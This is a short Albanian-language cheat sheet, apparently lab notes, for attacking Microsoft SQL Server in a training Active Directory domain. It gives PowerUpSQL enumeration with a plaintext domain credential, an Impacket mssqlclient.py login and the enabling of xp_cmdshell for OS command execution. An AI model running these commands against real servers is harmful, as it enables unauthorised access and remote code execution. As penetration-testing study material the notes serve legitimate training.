
MSSQL me PowerUpSQL
```bash
# Enumerim MSSQL me PowerUpSQL 
Import-Module .\PowerUpSQL.ps1 Get-SQLInstanceDomain Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'SELECT @@version'
```


mssqlclient.py
```bash
# Përdorimi i mssqlclient.py (Impacket) 
mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
```


```bash
# Aktivizimi i xp_cmdshell në MSSQL 
-- Aktivizon ekzekutimin e komandave OS nga SQL Server enable_xp_cmdshell
```